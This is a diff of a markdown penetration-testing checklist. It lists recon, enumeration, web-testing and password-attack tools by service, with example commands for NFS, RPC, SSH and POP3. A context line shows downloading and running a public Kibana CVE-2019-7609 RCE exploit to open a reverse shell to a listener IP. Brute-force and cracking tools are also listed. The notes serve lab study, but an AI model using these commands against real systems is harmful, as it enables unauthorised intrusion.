@@ -19,8 +19,8 @@ PROCESS
 - Find Open Ports
 - Find Service and Version behind Open Ports
 - Network Scan
-- Scan and Enumerate Service
-- Scan and Enumerate Platform
+- Scan/Enumerate Service
+- Scan/Enumerate Platform
 TOOLS
 - nmap
 - rustscan
@@ -45,6 +45,7 @@ OUPUT
 - Services
 - service:user:pass
 - vulnerability
+- exploit
 - Reverse shell
 
 
@@ -95,12 +96,13 @@ OUPUT
     - [telnet]
     - [netcat]
 - HTTP
-    - Browser
+    - [Browser]
         - Source
         - Network
         - javascript
         - /robots.txt
         - /sitemap.xml
+        - Debugger
     - Directory fuzzing
         - [dirb]
         - [dirbuster]
@@ -108,11 +110,24 @@ OUPUT
         - [wfuzz]
         - [ffuf]
         - [feroxbuster]
+        - [waybackurl]
+        - [katana]
     - [BurpSuite]
-        - Request
-        - Response
-        - Intruder
+        - Log every traffic
+        - Visit all resources in [Browesr]
+        - Do 
+            - Signup
+            - Singin
+            - Verification
+            - Change password
+            - Forgot password
+            - Delete account
+            - Oath login
+        - Use differnet services in web application
+        - Check all Request/Response
+        - Check headers
         - Repeater
+        - Intruder
     - [wpscan]: Wordpress CMS scan
     - [Manual]: Find Web Applicatin Vulnerability:
         - OWASP Top 10
@@ -138,28 +153,28 @@ OUPUT
             - In-Band SQL Injection
             - Blind SQLi
     - [whatweb]
-    - [nikto]: Vulnerability scanning
-    - [searchsploit]: Finding and web application vulnerabilities
-    - [hydra]: Brute Force Login
-    - [metasploit]: Finding and exploiting web application vulnerabilities
-    - [Password]: Authentication Attack
-        - [JtR]: Single Mode / Wordlist / Brute-Force
-        - [hydra]: Wordlist Attack
-        - [crunch]: Hybrid Dictionary Attack [crunch]
-        - [RainbowCrack]: Rainbow Tables http://project-rainbowcrack.com/table.htm
+    - [nikto]:              Vulnerability scanning
+    - [searchsploit]:       Finding and web application vulnerabilities
+    - [hydra]:              Brute Force Login
+    - [metasploit]:         Finding and exploiting web application vulnerabilities
+    - [Password]:           Authentication Attack
+        - [JtR]:                Single Mode / Wordlist / Brute-Force
+        - [hydra]:              Wordlist Attack
+        - [crunch]:             Hybrid Dictionary Attack [crunch]
+        - [RainbowCrack]:       Rainbow Tables http://project-rainbowcrack.com/table.htm
     - [python]
-        - [2to3]: Convert pythonRecon2 to python3
-        - Run python expolit file again
+        - [2to3]:           Convert pythonRecon2 to python3
+        - [python]          Run python expolit file again
 - NFS
-    - [mount]: Mounting NFS shares <sudo mount -t nfs IP:share /tmp/mount/ -nolock>
+    - [mount]:              Mounting NFS shares <sudo mount -t nfs IP:share /tmp/mount/ -nolock>
 - SMTP
     - [msfconsole]
 - RPC
-    - [nmap] <nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount target.ip>
-    - [rpcinfo] <rpcinfo target.ip>
-    - [showmount] <showmount -e target.ip>
-    - [mount] <sudo mount -t nfs target.ip:/share /mnt/nfs>
-    - [umount] <sudo umount -f -l /mnt/nfs>
+    - [nmap]            <nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount target.ip>
+    - [rpcinfo]         <rpcinfo target.ip>
+    - [showmount]       <showmount -e target.ip>
+    - [mount]           <sudo mount -t nfs target.ip:/share /mnt/nfs>
+    - [umount]          <sudo umount -f -l /mnt/nfs>
 - SSH
     - [ssh]:
         - <ssh user@target.ip -p 22>
@@ -191,7 +206,6 @@ OUPUT
 - POP3
     - [telnet] <telnet target.ip 110>
 
-
 # Scan and Enumerate Platform
 - Wordpress
     - [wpscan]
@@ -205,9 +219,6 @@ OUPUT
         - wget https://raw.githubusercontent.com/LandGrey/CVE-2019-7609/master/CVE-2019-7609-kibana-rce.py
         - python2 CVE-2019-7609-kibana-rce.py -h
         - python2 CVE-2019-7609-kibana-rce.py -u http://target.ip:5601 -host 10.8.56.2 -port 4444 --shell
-
-
-
 
 # References
 [//]: # (References)
